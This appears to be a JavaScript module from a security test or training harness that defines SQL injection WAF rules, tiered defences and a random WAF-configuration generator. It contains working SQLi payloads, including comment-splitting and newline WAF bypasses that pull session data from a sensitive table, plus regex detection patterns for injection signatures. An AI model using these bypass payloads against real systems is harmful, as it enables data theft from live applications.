// SQLi — per-tier defence contract.
// Pool of signature WAF rules a real WAF would carry for SQLi.
// Canonical: ' UNION SELECT ...
// Bypass: comment-splitting (/**/), which evades \bUNION\s+SELECT\b style rules.

export const RULE_POOL = [
  // Naive UNION SELECT (whitespace-separated)
  { name: 'sqli-union-select',  pattern: '\\bunion\\s+(all\\s+)?select\\b', flags: 'i' },
  // Tautology OR 1=1 patterns
  { name: 'sqli-or-tautology',  pattern: "\\bor\\s+'?\\w+'?\\s*=\\s*'?\\w+'?", flags: 'i' },
  // Stacked queries
  { name: 'sqli-stacked',       pattern: ';\\s*(select|insert|update|delete|drop)\\b', flags: 'i' },
  // Time-based SLEEP / BENCHMARK
  { name: 'sqli-sleep',         pattern: '\\bsleep\\s*\\(', flags: 'i' },
  { name: 'sqli-benchmark',     pattern: '\\bbenchmark\\s*\\(', flags: 'i' },
  // Schema enumeration
  { name: 'sqli-info-schema',   pattern: '\\binformation_schema\\b', flags: 'i' },
  // SQL comment terminators directly after a quote
  { name: 'sqli-quote-comment', pattern: "'\\s*--", flags: 'i' },
  // Hex literal evasion
  { name: 'sqli-hex',           pattern: '0x[0-9a-f]{6,}', flags: 'i' },
]

// Bypass: comment-splitting between UNION and SELECT defeats \s+ matching.
// Hex schema names also pass through 0x rule (we generate ASCII names).
export const BYPASS_TEMPLATES = [
  // Comment-splitting
  (canary, scenario) =>
    `%' /**/UNION/**/SELECT/**/id,owner_session,data/**/FROM/**/${scenario.sensitiveTable}/**/--`,
  // Parenthesised UNION
  (canary, scenario) =>
    `%') UNION(SELECT id,owner_session,data FROM ${scenario.sensitiveTable})--`,
  // Newline-separated (some WAF \s+ rules use [ \t]+ only)
  (canary, scenario) =>
    `%'\nUNION\nSELECT id,owner_session,data FROM ${scenario.sensitiveTable}\n--`,
]

export const defences = {
  0: {
    canonicalPayload: (canary, scenario) =>
      `%' UNION SELECT id, owner_session, data FROM ${scenario.sensitiveTable} --`,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    // Naive UNION SELECT is blocked by xss/sqli union-select rule.
    // Comment-splitting bypass survives.
    canonicalPayload: (canary, scenario) =>
      `%' UNION SELECT id, owner_session, data FROM ${scenario.sensitiveTable} --`,
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

export function generateT1Config(rng = Math.random) {
  // union-select rule is required (guarantees naive blocked)
  const required = ['sqli-union-select']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const extraCount = 3 + Math.floor(rng() * (optional.length - 2))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
